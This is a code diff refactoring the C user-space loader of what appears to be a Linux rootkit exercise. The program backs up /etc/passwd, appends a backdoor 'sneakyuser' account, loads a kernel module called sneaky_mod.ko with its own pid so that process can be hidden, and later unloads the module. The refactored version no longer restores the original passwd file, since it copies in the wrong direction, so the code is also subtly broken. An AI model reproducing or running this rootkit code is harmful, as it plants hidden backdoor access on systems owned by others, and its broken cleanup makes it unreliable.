@@ -7,60 +7,61 @@
 #include <fcntl.h>
 #include <sys/wait.h>
 
-void main() {
+void copy_passwd() {
   FILE* fp1;
   FILE* fp2;
-  char ch;
-  fp1 = fopen("/etc/passwd", "r");
-  if (fp1 == NULL) {
-    puts ("cannot open this file");
-    exit(1);
+  char c;
+  if (!(fp1 = fopen("/etc/passwd", "r"))) {
+    printf("cannot open this file\n");
+    exit(-1);
   }
-  fp2 = fopen("/tmp/passwd", "w");
-  if (fp2 == NULL) {
-    puts("Not able to open this file");
+  if (!(fp2 = fopen("/tmp/passwd", "w"))) {
+    printf("Not able to open this file");
     fclose(fp1);
-    exit(1);
+    exit(-1);
   }
-  while(1) {
-    ch = fgetc(fp1);
-    if (ch == EOF) {
-      break;
-    }
-    fputc(ch, fp2);
+  while ((c = fgetc(fp1)) != EOF) {
+    fputc(c,fp2);
   }
   fclose(fp1);
   fclose(fp2);
-  FILE* fp3 = fopen("/etc/passwd", "a");
-  if (fp3 == NULL) {
-    puts ("cannot open this file");
-    exit(1);
+  
+}
+void insert_password() {
+  // copy /etc/passwd to /tmp/passwd
+  // insert a sneakyuser into /etc/passwd
+  FILE* fp;
+ 
+  copy_passwd();
+  
+  if (!(fp = fopen("/etc/passwd", "a"))) {
+    printf ("cannot open this file");
+    exit(-1);
   }
-  char buffer[256] = "sneakyuser:abc123:2000:2000:sneakuser:/root:bash\n";
-  fprintf(fp3, "%s", buffer);
-  fclose(fp3);
+  
+  char * sneaky = "sneakyuser:abc123:2000:2000:sneakuser:/root:bash\n";
+  fprintf(fp, "%s", sneaky);
+  fclose(fp);
+}
+
+void load_module() {
+  // load the kernel module
+  // pass the pid as argument
   pid_t pid;
   pid_t wpid;
   int status;
-  char c;
+  char ch;
   pid = fork();
   if (pid < 0) {
     printf("%s\n", "fork error!");
-  }
-  //child process
-  else if (pid == 0) {
-    char* args[3];
+  } else if (pid == 0) {
     int sneaky_id = getppid();
     char str[128];
     sprintf(str, "sneaky_pid=%d", sneaky_id);
-    args[0] =  "insmod";
-    args[1] = "sneaky_mod.ko";
-    args[2] = str;
-    args[3] = NULL;
     printf("sneaky_process pid = %d\n", sneaky_id);
-    execvp(args[0], args);
+    execlp("insmod", "insmod", "sneaky_mod.ko", str, NULL);
   } else {
-    //parent process
+  
     wpid = waitpid(pid, &status, WUNTRACED);
     if (WIFEXITED(status)) {
       printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
@@ -68,52 +69,41 @@ void main() {
     if (WIFSIGNALED(status)) {
       printf("%s, %d\n", "Program was killed by signal", WTERMSIG(status));
     }
-    do {
-      c = getc(stdin);
-      if (c == 'q') {
-	break;
-      }
-    } while (1);
+    while((ch = getc(stdin)) != 'q') {
+      //dummy
+    }
   }
-  //unload the kernel module when the child process returns
-  pid_t pid2;
-  pid_t wpid2;
-  pid2 = fork();
-  if (pid2 == 0) {
-    char* argss[4];
-    argss[0] = "rmmod";
-    argss[1] = "sneaky_mod";
-    argss[2] = NULL;
-    argss[3] = NULL;
-    execvp(argss[0], argss);
+
+}
+
+
+void unload_module() {
+   //unload the kernel module when the child process returns
+  
+  pid_t pid;
+  pid_t wpid;
+  int status;
+  pid = fork();
+  if (pid == 0) {
+    execlp("rmmod", "rmmod", "sneaky_mod.ko", NULL);
   }
   else {    //copy the tmp/passwd file back to the /etc/passwd file
-    wpid2 = waitpid(pid2, &status, WUNTRACED);
+    wpid = waitpid(pid, &status, WUNTRACED);
     if (WIFEXITED(status)) {
       printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
     }
     if (WIFSIGNALED(status)) {
       printf("%s, %d\n", "program was killed by signal", WTERMSIG(status));
     }
-    fp2 = fopen("/tmp/passwd", "r");
-    if (fp2 == NULL) {
-      puts("Not able to open this file");
-      exit(1);
-    }
-    fp1 = fopen("/etc/passwd", "w");
-    if (fp1 == NULL) {
-      puts("Not able to open this file");
-      fclose(fp2);
-      exit(1);
-    }
-    while (1) {
-      ch = fgetc(fp2);
-      if (ch == EOF) {
-	break;
-      }
-      fputc(ch, fp1);
-    }
-    fclose(fp1);
-    fclose(fp2);
+    copy_passwd();
   }
+
+}
+void main() {
+  insert_password();
+
+  load_module();
+
+  unload_module();
+
 }
